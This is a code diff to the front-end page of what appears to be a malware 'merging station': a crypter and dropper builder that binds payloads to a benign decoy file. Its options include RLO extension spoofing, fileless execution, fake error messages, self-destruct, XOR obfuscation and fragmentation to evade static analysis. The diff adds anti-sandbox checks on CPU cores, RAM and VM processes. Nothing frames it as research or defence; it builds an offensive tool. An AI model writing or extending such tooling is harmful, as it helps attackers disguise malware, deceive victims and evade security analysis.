@@ -12,7 +12,7 @@ import { Label } from '@/components/ui/label';
 import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
 import { useToast } from '@/hooks/use-toast';
-import { Loader2, Binary, FileCode, Shield, Download, Clipboard, Image as ImageIcon, Key, PlusCircle, Trash2 } from 'lucide-react';
+import { Loader2, Binary, FileCode, Shield, Download, Clipboard, Image as ImageIcon, Key, PlusCircle, Trash2, Bot } from 'lucide-react';
 import { Progress } from '@/components/ui/progress';
 import { Form, FormControl, FormDescription, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
 import { Badge } from '@/components/ui/badge';
@@ -36,6 +36,11 @@ const formSchema = z.object({
   showFakeError: z.boolean().default(false),
   fakeErrorMessage: z.string().optional(),
   selfDestruct: z.boolean().default(false),
+  enableSandboxDetection: z.boolean().default(false),
+  checkCpuCores: z.boolean().default(true),
+  checkRam: z.boolean().default(true),
+  checkVmProcesses: z.boolean().default(true),
+  sandboxAbortMessage: z.string().optional(),
 });
 
 const outputFormats = {
@@ -71,6 +76,11 @@ export default function MergingStationPage() {
       showFakeError: false,
       fakeErrorMessage: 'The file is corrupt and cannot be opened.',
       selfDestruct: false,
+      enableSandboxDetection: false,
+      checkCpuCores: true,
+      checkRam: true,
+      checkVmProcesses: true,
+      sandboxAbortMessage: 'This application cannot run in a virtual environment.',
     },
   });
 
@@ -81,6 +91,7 @@ export default function MergingStationPage() {
 
   const watchObfuscationType = form.watch('obfuscationType');
   const watchShowFakeError = form.watch('showFakeError');
+  const watchEnableSandboxDetection = form.watch('enableSandboxDetection');
 
  const applyExtensionSpoofing = (filename: string): string => {
     const parts = filename.split('.');
@@ -131,16 +142,9 @@ export default function MergingStationPage() {
         log('Files encoded. Sending to server for merging...');
         
         const response = await mergePayloads({
+            ...values,
             payloads: payloads,
             benign: { name: benignFile.name, content: benignContent },
-            outputFormat: values.outputFormat as any,
-            obfuscationType: values.obfuscationType,
-            encryptionKey: values.obfuscationType === 'xor' ? values.xorKey : undefined,
-            useFragmentation: values.useFragmentation,
-            executionDelay: values.executionDelay,
-            fileless: values.fileless,
-            fakeErrorMessage: values.showFakeError ? values.fakeErrorMessage : undefined,
-            selfDestruct: values.selfDestruct,
         });
         
         if (!response.success || !response.scriptContent) {
@@ -154,6 +158,7 @@ export default function MergingStationPage() {
         if (values.executionDelay) log(`Execution delayed by ${values.executionDelay} seconds.`);
         if (values.showFakeError) log(`Fake error message enabled.`);
         if (values.selfDestruct) log(`Self-destruct enabled.`);
+        if (values.enableSandboxDetection) log('Anti-VM/Sandbox checks enabled.');
 
         const finalName = values.extensionSpoofing
             ? applyExtensionSpoofing(values.outputName)
@@ -241,10 +246,8 @@ export default function MergingStationPage() {
                   <FormField control={form.control} name="outputFormat" render={({ field }) => ( <FormItem><FormLabel>Output Format</FormLabel><Select onValueChange={handleFormatChange} defaultValue={field.value}><FormControl><SelectTrigger><SelectValue /></SelectTrigger></FormControl><SelectContent>{Object.entries(outputFormats).map(([key, value])=><SelectItem key={key} value={key} disabled={value.disabled}>{value.name}</SelectItem>)}</SelectContent></Select></FormItem> )}/>
                   <Separator />
                   <Label>Dropper Behavior</Label>
-                   <FormField control={form.control} name="extensionSpoofing" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Extension Spoofing</FormLabel><FormDescription>Use RLO character to mask the true extension.</FormDescription></div></FormItem> )}/>
                    <FormField control={form.control} name="fileless" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Fileless Execution</FormLabel><FormDescription>Run payload in memory instead of writing to disk.</FormDescription></div></FormItem> )}/>
                    <FormField control={form.control} name="executionDelay" render={({ field }) => ( <FormItem><FormLabel>Execution Delay (seconds)</FormLabel><FormControl><Input type="number" placeholder="e.g., 10" {...field} /></FormControl></FormItem> )}/>
-                   <FormField control={form.control} name="selfDestruct" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Self-Destruct after Execution</FormLabel><FormDescription>Remove the dropper script after it runs.</FormDescription></div></FormItem> )}/>
                      <FormField control={form.control} name="showFakeError" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Display Fake Error Message</FormLabel></div></FormItem> )}/>
                      {watchShowFakeError && (
                         <FormField control={form.control} name="fakeErrorMessage" render={({ field }) => ( <FormItem><FormLabel>Error Message</FormLabel><FormControl><Textarea placeholder="The file is corrupt..." {...field} /></FormControl><FormMessage /></FormItem> )}/>
@@ -252,7 +255,7 @@ export default function MergingStationPage() {
                 </CardContent>
               </Card>
               
-               <div className="md:col-span-2">
+               <div className="md:col-span-2 grid md:grid-cols-2 gap-6">
                  <Card>
                     <CardHeader><CardTitle className="text-lg">3. Crypter / Obfuscation</CardTitle></CardHeader>
                     <CardContent className="space-y-4">
@@ -275,7 +278,33 @@ export default function MergingStationPage() {
                          <FormField control={form.control} name="useFragmentation" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Payload Fragmentation</FormLabel><FormDescription>Split the payload into smaller chunks to evade static analysis.</FormDescription></div></FormItem> )}/>
                     </CardContent>
                  </Card>
+
+                 <Card>
+                    <CardHeader><CardTitle className="text-lg">4. Anti-Analysis</CardTitle></CardHeader>
+                    <CardContent className="space-y-4">
+                        <FormField control={form.control} name="enableSandboxDetection" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Sandbox Detection</FormLabel><FormDescription>Check for VM environments before running.</FormDescription></div></FormItem> )}/>
+                        {watchEnableSandboxDetection && (
+                            <div className="space-y-3 pl-4 border-l ml-2">
+                                <FormField control={form.control} name="checkCpuCores" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><FormLabel className="text-sm font-normal">Check CPU Cores (&lt;= 2)</FormLabel></FormItem> )}/>
+                                <FormField control={form.control} name="checkRam" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><FormLabel className="text-sm font-normal">Check RAM (&lt; 4GB)</FormLabel></FormItem> )}/>
+                                <FormField control={form.control} name="checkVmProcesses" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><FormLabel className="text-sm font-normal">Check for VM Processes</FormLabel></FormItem> )}/>
+                                <FormField control={form.control} name="sandboxAbortMessage" render={({ field }) => ( <FormItem><FormLabel className="text-sm">Abort Message</FormLabel><FormControl><Textarea placeholder="The message to show if a sandbox is detected." {...field} /></FormControl></FormItem> )}/>
+                            </div>
+                        )}
+                    </CardContent>
+                 </Card>
+
                </div>
+
+                <div className="md:col-span-2">
+                    <Card>
+                         <CardContent className="p-4 space-y-4">
+                            <FormField control={form.control} name="extensionSpoofing" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Extension Spoofing</FormLabel><FormDescription className="text-xs">Use RLO character to mask the true file extension.</FormDescription></div></FormItem> )}/>
+                            <FormField control={form.control} name="selfDestruct" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Self-Destruct after Execution</FormLabel><FormDescription className="text-xs">Remove the dropper script after it runs.</FormDescription></div></FormItem> )}/>
+                         </CardContent>
+                    </Card>
+                </div>
+
 
             </div>
 
